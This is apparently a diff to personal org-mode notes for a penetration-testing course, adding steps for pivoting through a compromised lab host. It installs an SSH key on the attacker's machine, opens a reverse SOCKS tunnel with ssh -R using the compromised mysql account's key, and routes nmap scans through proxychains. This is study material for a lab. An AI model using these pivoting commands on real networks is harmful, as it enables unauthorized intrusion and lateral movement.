@@ -3498,7 +3498,60 @@ ls /mnt/scripts
   ## found some files
 cat system_report.ps1
     #+end_src
-    // continue p796
+    
+*** remote port forward, SOCKs && proxychains
+    + src-SOCKS:
+    #+begin_src sh
+  ## zora
+ssh-keygen
+cat /path/to/pk.pub
+
+  ## kali
+cat << EOF >> ~/.ssh/authorized_keys
+from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4c jmvS... mysql@zora
+EOF
+
+  ## zora, the -R without [host] specified create a SOCKS proxy on localhost:1080 on kali
+ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
+sudo netstat -tulpn
+    #+end_src
+    + src-proxychains:
+    #+begin_src sh
+  ## kali, edit /etc/proxychain.conf
+[ProxyList]
+socks4 127.0.0.1 1080
+  ## (PWK p799)
+    #+end_src
+     
+*** nmap with proxychains
+    + ref: [[https://security.stackexchange.com/questions/120708/nmap-through-proxy/120723#120723][nmap-through-proxy]]
+    + info:
+      - SOCKS4 proxy TCP only. Hence ICMP ping is not reachable (use -Pn).
+      - SOCKS5 may extend to UDP.
+    + src:
+    #+begin_src sh
+proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
+  ## -Pn disable pinging, since ICMP is not TCP
+  ## -sT perform a connect scan, since TCP only
+    #+end_src
+    // continue p802
+
+        
+*** TODO SOCKS
+    + ref:
+      - [[./ref/b3cp24_understanding-implementing-socks-server-guide-set-socks-environment_2326.pdf][socks basic (a giac paper)]] (p7, the "CONNECTION"; p8, a global socks proxy (client) manipulate TCP stack)
+    + questions:
+      - pkg encrypted or cleartext
+      - SOCKS5 auth flow, how does the credential exchange works.
+
+    
+*** TODO proxychains
+    + ref: [[https://man.cx/proxychains][proxychains]]
+    + src:
+    #+begin_src sh
+proxychains <program>
+    #+end_src
+
 
 
 
